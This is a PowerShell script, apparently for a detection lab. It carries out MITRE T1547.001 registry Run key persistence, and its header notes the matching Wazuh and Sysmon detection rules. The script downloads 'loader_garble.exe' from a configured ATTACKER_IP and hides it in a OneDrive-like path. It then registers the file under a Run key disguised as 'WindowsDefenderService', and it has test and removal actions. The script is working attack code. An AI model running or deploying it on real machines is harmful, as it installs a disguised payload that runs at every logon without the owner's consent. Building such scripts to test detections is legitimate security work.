# =============================================================================
# persist_01_regrun.ps1 -- Registry Run Key Persistence
# MITRE ATT&CK: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys
# =============================================================================
# Wazuh Detection:
#   - Sysmon EID 13 (RegistryEvent - Value Set)
#     RuleName: "Registry value set"
#     TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderService
#   - Wazuh Rule ID: 61603, 61612 (Sysmon registry modification)
# =============================================================================

param(
    [ValidateSet("install","test","remove")]
    [string]$Action = "install"
)

# ==============================================================================
# CONFIG
# ==============================================================================
$ATTACKER_IP  = "192.168.247.139"
$PAYLOAD_URL  = "http://${ATTACKER_IP}:9090/loader_garble.exe"
$PAYLOAD_PATH = "$env:LOCALAPPDATA\Microsoft\OneDrive\OneDriveSync.exe"

# Registry persistence config
$REG_PATH  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$REG_NAME  = "WindowsDefenderService"
$REG_VALUE = $PAYLOAD_PATH
# ==============================================================================

function Download-Payload {
    if (-not (Test-Path $PAYLOAD_PATH)) {
        Write-Host "[*] Downloading payload from $PAYLOAD_URL ..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $PAYLOAD_URL -OutFile $PAYLOAD_PATH -UseBasicParsing -ErrorAction Stop
            Write-Host "[+] Payload saved to: $PAYLOAD_PATH" -ForegroundColor Green
        } catch {
            Write-Warning "[!] Download failed. Creating dummy payload for testing..."
            [System.IO.File]::WriteAllText($PAYLOAD_PATH, "# dummy payload for lab testing")
        }
    } else {
        Write-Host "[*] Payload already exists at: $PAYLOAD_PATH" -ForegroundColor Cyan
    }
}

function Install-Persistence {
    Write-Host "`n[*] Installing Registry Run Key persistence..." -ForegroundColor Cyan
    Download-Payload
    try {
        if (-not (Test-Path $REG_PATH)) {
            New-Item -Path $REG_PATH -Force | Out-Null
        }
        # Write Run key -- Sysmon EID 13 triggers here
        Set-ItemProperty -Path $REG_PATH -Name $REG_NAME -Value $REG_VALUE -Type String -Force
        Write-Host "[+] Registry key set:" -ForegroundColor Green
        Write-Host "    Path : $REG_PATH" -ForegroundColor Gray
        Write-Host "    Name : $REG_NAME" -ForegroundColor Gray
        Write-Host "    Value: $REG_VALUE" -ForegroundColor Gray
        Write-Host "[+] Persistence installed. Payload will run on next logon." -ForegroundColor Green
        return $true
    } catch {
        Write-Error "[!] Failed to install persistence: $_"
        return $false
    }
}

function Test-Persistence {
    Write-Host "`n[*] Verifying Registry Run Key persistence..." -ForegroundColor Cyan
    $ok = $true
    try {
        $val = Get-ItemPropertyValue -Path $REG_PATH -Name $REG_NAME -ErrorAction Stop
        Write-Host "[+] Registry key FOUND: $REG_NAME = $val" -ForegroundColor Green
    } catch {
        Write-Host "[-] Registry key NOT found: $REG_NAME" -ForegroundColor Red
        $ok = $false
    }
    if (Test-Path $PAYLOAD_PATH) {
        Write-Host "[+] Payload file EXISTS: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload file MISSING: $PAYLOAD_PATH" -ForegroundColor Red
        $ok = $false
    }
    if ($ok) { Write-Host "[RESULT] Persistence ACTIVE v" -ForegroundColor Green }
    else      { Write-Host "[RESULT] Persistence INCOMPLETE x" -ForegroundColor Red }
    return $ok
}

function Remove-Persistence {
    Write-Host "`n[*] Removing Registry Run Key persistence..." -ForegroundColor Cyan
    try {
        Remove-ItemProperty -Path $REG_PATH -Name $REG_NAME -ErrorAction Stop
        Write-Host "[+] Registry key removed: $REG_NAME" -ForegroundColor Green
    } catch {
        Write-Host "[-] Registry key not found (already removed?)" -ForegroundColor Yellow
    }
    if (Test-Path $PAYLOAD_PATH) {
        Remove-Item -Path $PAYLOAD_PATH -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Payload removed: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload file not found (already removed?)" -ForegroundColor Yellow
    }
    Write-Host "[+] Cleanup complete." -ForegroundColor Green
}

# ==============================================================================
# Main Logic
# ==============================================================================
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host " persist_01_regrun.ps1 -- T1547.001 Registry Run Key" -ForegroundColor Magenta
Write-Host " Wazuh: Sysmon EID 13 (RegistryEvent - Value Set)" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta

switch ($Action) {
    "install" { Install-Persistence }
    "test"    { Test-Persistence }
    "remove"  { Remove-Persistence }
}
